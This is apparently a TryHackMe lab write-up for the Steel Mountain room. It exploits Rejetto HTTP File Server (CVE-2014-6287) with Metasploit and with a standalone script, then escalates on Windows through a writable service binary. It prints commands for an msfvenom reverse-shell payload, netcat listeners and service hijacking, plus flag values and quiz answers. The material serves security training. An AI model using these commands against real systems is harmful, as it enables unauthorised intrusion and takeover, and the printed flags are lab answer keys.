![Steel Mountain Banner](https://i.imgur.com/Uo9F3uE.jpg)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Cover.png" alt="Steel Mountain Logo">
</p>

# Steel Mountain

This guide contains the answer and steps necessary to get to them for the [Steel Mountain](https://tryhackme.com/room/steelmountain) room.

## Table of contents

- [Introduction](#introduction)
- [Initial Access](#initial-access)
- [Privilege Escalation](#privilege-escalation)
- [Access and Escalation Without Metasploit](#access-and-escalation-without-metasploit)

### Introduction

1. Deploy the machine.Who is the employee of the month?

   When we input the machine ip into our browser, we are taken to a web page listing someone as employee of the month. We can open the image in a new tab and check the file name which contains the name of said employee.

   ![Employee Month](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Employee_Month.png)

   ><details><summary>Click for answer</summary>Bill Harper</details>

### Initial Access

1. Scan the machine with nmap. What is the other port running a web server on?

   Using nmap we can see the webpage we just visited on port 80 and another fileserver is listed in the results.

   ```console
   sudo nmap 10.10.175.6 -sS -sV -Pn -p-
   ```

   ![Initial Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Initial_Nmap.png)

   ><details><summary>Click for answer</summary>8080</details>

2. Take a look at the other web server. What file server is running?

   Since we can't find the information needed from our nmap scan, we navigate to the server in our browser. Here we find information on the name of the file server as well as the brand in the url.

   ![Initial File Server](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Initial_File_Server.png)

   ><details><summary>Click for answer</summary>Rejetto HTTP File Server</details>

3. What is the CVE number to exploit this file server?

   We can use `searchsploit` to look for any vulnerabilities. We are using version 2.3.

   ![Initial Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Initial_Exploit.png)

   Looks like there is a remote code execution vulnerability. On exploit-db we can see there has already been writen en Metasploit module for it.

   ><details><summary>Click for answer</summary>2014-6287</details>

4. Use Metasploit to get an initial shell. What is the user flag?

   Start Metasploit and look for the module related to the http file server exploit.

   ```console
   msfconsole
   search rejetto
   use 0
   ```

   ![Initial Module](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Initial_Module.png)

   Now we must set all the necessary options like ip addresses and port numbers.

   ![Initial Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Initial_Shell.png)

   After running the exploit we have received a meterpreter session. Dropping into the system using `shell` we get a shell on the system.

   Now we can navigate to bill's desktop and find our flag.

   ![Initial Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Initial_Flag.png)

   ><details><summary>Click for answer</summary>b04763b6fcf51fcd7c13abc7db4fd365</details>

### Privilege Escalation

1. To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities -"PowerUp aims to be a clearinghouse of common Windows privilege escalationvectors that rely on misconfigurations."You can download the script here. If you want to download it via the command line, be careful not to download the GitHub page instead of the raw script. Now you can use the `upload` command in Metasploit to upload the script. To execute this using Meterpreter, I will type `load powershell` into meterpreter. Then I will enter powershell by entering `powershell_shell`:

   I already have the file on my system, so I will upload it to the machine using `upload` then run Powershell en execute the script. It would also have been possible to do this from the regular shell we obtained to navigate to the users desktop.

   ![Escalate Upload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Upload.png)

   ![Escalate Execute](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Execute.png)

2. Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as anunquoted service pathvulnerability?

   We can se one program with the `canrestart` option set to true. 

   ![Escalate Can Restart](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Can_Restart.png)

   ><details><summary>Click for answer</summary>AdvancedSystemCareService9</details>

3. The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program! Use msfvenom to generate a reverse shell as an Windows executable. `msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe` Upload your binary and replace the legitimate one. Then restart the program to get a shell as root. Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.

   First thing we will do is create our payload with `msfvenom`.

   ```console
   msfvenom -p windows/shell_reverse_tcp lhost=10.18.78.136 lport=1337 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
   ```

   ![Escalate Payload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Payload.png)

   Using the same method as before, we upload the payload to the machine with metasploit.

   ```console
   upload ASCService.exe
   ```

   ![Escalate Upload Payload](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Upload_Payload.png)

   Now we must first stop the service so we can overwrite the executable for it. From the PowerUp script we found the service name we must use.

   ```console
   sc stop AdvancedSystemCareService9
   sc query AdvancedSystemCareService9
   ```

   Now copy the "ASCService.exe" payload we created to the folder of the service and overwrite the existing.

   ![Escalate Overwrite Executable](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Overwrite_Executable.png)

   Before we start the service, we must setup a listener with `netcat`.

   ```console
   nc -nlvp 1337
   ```

   Now we can start the service using:

   ```console
   sc start AdvancedSystemCareService9
   sc query AdvancedSystemCareService9
   ```

   ![Escalate Start Service](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Start_Service.png)

   Eventhough the service didn't start (which makes sense as the executabel only contains our reverse shell), we did receive a connection in our listener!

   ![Escalate Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Root_Shell.png)

4. What is the root flag?

   Now that we have root access to the system, we can navigate to our flag in the Administrator folder. After some digging we find the file on the Desktop.

   ![Escalate Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Escalate_Root_Flag.png)

   ><details><summary>Click for answer</summary>9af5f314f57607c00fd09803a587db80</details>

### Access and Escalation Without Metasploit

1. To begin we shall be using the same CVE. However, this time let's use thisexploit. *Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!* To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from GitHub! You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!

   First we download both the script as well as a netcat binary for windows. We rename the binary to `nc.exe` and put it in our current directory.

   The we must modify the script to our needs.

   - Change the ip and port to your attack machine.
   - I had to replace `import urllib2` with `import urllib.request as urllib2`, because of an error with urllib2.
   - I also had to add parenthesis to the final print command as I got and error there as well.
   
   ![Manual Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Manual_Script.png)

   If you get an error like below, you must add an `r` to line 37 above.

   ![Manual Error](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Manual_Error.png)

   Make sure to setup a listener with:

   ```console
   nc -nlvp 1338
   ```

   And a webserver on port 80 (which is what the script uses).

   ```console
   python3 -m http.server 80
   ```

   After all this is done, we can run the exploit with the target ip and port number.

   ![Manual Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Manual_Exploit.png)

   After the first run, we can see our netcat binary was uploaded to the machine.

   ![Manual Server](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Manual_Server.png)

   After the second run, we can see we received an connection on our listener.

   ![Manual Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/steelmountain/Steel_Mountain_Manual_Shell.png)

   The remaining steps the get a root shell are similar as before.

2. Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c. Once we run winPeas, we see that it points us towards unquoted paths. We can
 see that it provides us with the name of the service it is also running. What powershell -c command could we run to manually find out the service name? *Format is "powershell -c "command here"*

   Looking up which command to use in Powershell to view all active services on Windows, gives us the answer we are after.

   ><details><summary>Click for answer</summary>powershell -c "Get-Service"</details>

3. Now let's escalate to Administrator with our new found knowledge.Generate your payload using msfvenom and pull it to the system using powershell.Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.First we need to stop the service which we can do like so;sc stop AdvancedSystemCareService9Shortly followed by;sc start AdvancedSystemCareService9Once this command runs, you will see you gain a shell as Administrator on our listener!